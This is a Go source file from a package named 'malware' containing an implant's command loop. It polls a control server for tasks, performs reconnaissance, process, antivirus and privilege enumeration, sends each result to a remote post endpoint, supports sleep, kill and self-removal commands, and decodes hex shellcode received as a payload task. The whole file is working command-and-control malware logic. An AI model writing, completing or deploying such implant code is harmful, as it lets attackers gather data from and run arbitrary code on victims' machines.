package malware

import (
	"encoding/hex"
	"fmt"
	"os"
	"strconv"
)

func Work(config Config, key, name string) []byte {
	for {
		t, err := GetTask(config, key)
		if err != nil {
			return nil
		}
		switch t.Tag {
		case "recon":
			r, err := DoRecon(key)
			if err != nil {
				fmt.Println(err)
				return nil
			}
			_, err = PostRequest(r, config.PostEndpoint, config)
			if err != nil {
				fmt.Println(err)
				return nil
			}
		case "ps":
			ps, err := getProcessList(key)
			if err != nil {
				fmt.Println(err)
				return nil
			}
			_, err = PostRequest(ps, config.PostEndpoint, config)
			if err != nil {
				fmt.Println(err)
				return nil
			}
		case "av":
			ps, err := getAV(key)
			if err != nil {
				fmt.Println(err)
				return nil
			}
			_, err = PostRequest(ps, config.PostEndpoint, config)
			if err != nil {
				fmt.Println(err)
				return nil
			}
		case "priv":
			priv, err := getPriv(key)
			fmt.Println(priv)
			if err != nil {
				fmt.Println(err)
				return nil
			}
			_, err = PostRequest(priv, config.PostEndpoint, config)
			if err != nil {
				fmt.Println(err)
				return nil
			}
		case "kill":
			os.Exit(1)
		case "remove":
			removeKitten()
			os.Exit(1)
		case "sleep":
			time, err := strconv.Atoi(string(t.Payload))
			if err != nil {
				fmt.Println(err)
				return nil
			}
			config.SetSleep(time)
		case "payload":
			shellcode, _ := hex.DecodeString(string(t.Payload))
			return shellcode
		}
		fmt.Println(t.Tag)
		fmt.Println(t.Payload)
		fmt.Println(name)
		sleep(config)
	}
}
